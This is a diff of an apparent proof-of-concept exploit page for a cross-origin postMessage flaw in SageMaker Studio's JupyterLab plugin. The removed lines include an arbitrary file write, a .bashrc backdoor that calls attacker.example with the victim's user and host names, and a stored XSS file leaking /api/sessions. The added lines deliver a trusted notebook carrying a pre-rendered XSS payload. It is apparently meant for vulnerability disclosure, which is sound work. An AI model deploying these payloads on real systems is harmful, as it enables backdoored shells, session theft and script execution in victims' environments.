@@ -21,10 +21,9 @@
   <label>Target JupyterLab URL:</label>
   <input id="url" value="https://XXXXX.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
   <label>File path to write:</label>
-  <input id="path" value="pwned-by-postmessage.py" />
-  <label>File content:</label>
-  <input id="content" value="# PROOF: This file was written by an attacker-controlled page via cross-origin postMessage.&#10;# The SageMaker doc-manager plugin has no origin validation on its message handler.&#10;import os; print('EXPLOITED — running as:', os.popen('whoami').read())" />
+  <input id="path" value="pwned.ipynb" />
   <label>Wait for Studio to load (ms):</label>
+
   <input id="wait" value="8000" />
 
   <button onclick="exploit()">Launch Exploit</button>
@@ -38,8 +37,26 @@ function status(msg, cls) {
 function exploit() {
   var url = document.getElementById('url').value.trim();
   var path = document.getElementById('path').value.trim();
-  var content = document.getElementById('content').value;
   var wait = parseInt(document.getElementById('wait').value) || 8000;
+
+  var notebook = {
+    nbformat: 4,
+    nbformat_minor: 5,
+    metadata: { kernelspec: { display_name: "Python 3", language: "python", name: "python3" } },
+    cells: [{
+      cell_type: "code",
+      source: "# This notebook was written by an attacker via cross-origin postMessage",
+      metadata: { trusted: true },
+      outputs: [{
+        output_type: "display_data",
+        metadata: {},
+        data: {
+          "text/html": "<img src=x onerror='alert(document.domain)'>"
+        }
+      }],
+      execution_count: 1
+    }]
+  };
 
   // Phase 1: Open victim window
   var w = window.open(url, '_blank');
@@ -49,42 +66,18 @@ function exploit() {
   setTimeout(function() {
     if (w.closed) { status('Popup was closed.', 'err'); return; }
 
-    // Attack 1: Write attacker-controlled file (opens automatically in JupyterLab)
+    // Write trusted notebook with pre-rendered XSS output — auto-opens in JupyterLab
     w.postMessage({
       type: 'sagemaker:nbevent:OpenOrCreateFile',
-      payload: { type: 'file', path: path, content: content, format: 'text' }
+      payload: {
+        type: 'notebook',
+        path: path,
+        content: notebook,
+        format: 'json'
+      }
     }, '*');
-    status('[1/3] Wrote ' + path + ' (arbitrary file write)', 'ok');
-
-    // Attack 2: Backdoor .bashrc — executes next time victim opens a terminal
-    setTimeout(function() {
-      w.postMessage({
-        type: 'sagemaker:nbevent:OpenOrCreateFile',
-        payload: {
-          type: 'file',
-          path: '.bashrc',
-          content: '# Backdoored via postMessage — no origin check\ncurl https://attacker.example/exfil?user=$(whoami)\\&host=$(hostname)',
-          format: 'text'
-        }
-      }, '*');
-      status('[2/3] Wrote .bashrc (RCE on next terminal open)', 'ok');
-    }, 500);
-
-    // Attack 3: Drop stored XSS .html — auto-opens in JupyterLab
-    setTimeout(function() {
-      w.postMessage({
-        type: 'sagemaker:nbevent:OpenUntitledFile',
-        payload: {
-          type: 'file', ext: '.html', path: '',
-          content: '<h1>Stored XSS via postMessage</h1>'
-            + '<script>fetch("/api/sessions").then(r=>r.json()).then(d=>'
-            + 'document.write("<pre>"+JSON.stringify(d,null,2)+"</pre>"))<\/script>',
-          format: 'text'
-        }
-      }, '*');
-      status('[3/3] Wrote untitled .html (stored XSS, leaks /api/sessions)', 'ok');
-      status('Done. All 3 payloads delivered.', 'warn');
-    }, 1000);
+    status('Sent notebook → ' + path, 'ok');
+    status('If trusted, alert(document.domain) fires on open with no interaction.', 'warn');
   }, wait);
 }
 </script>
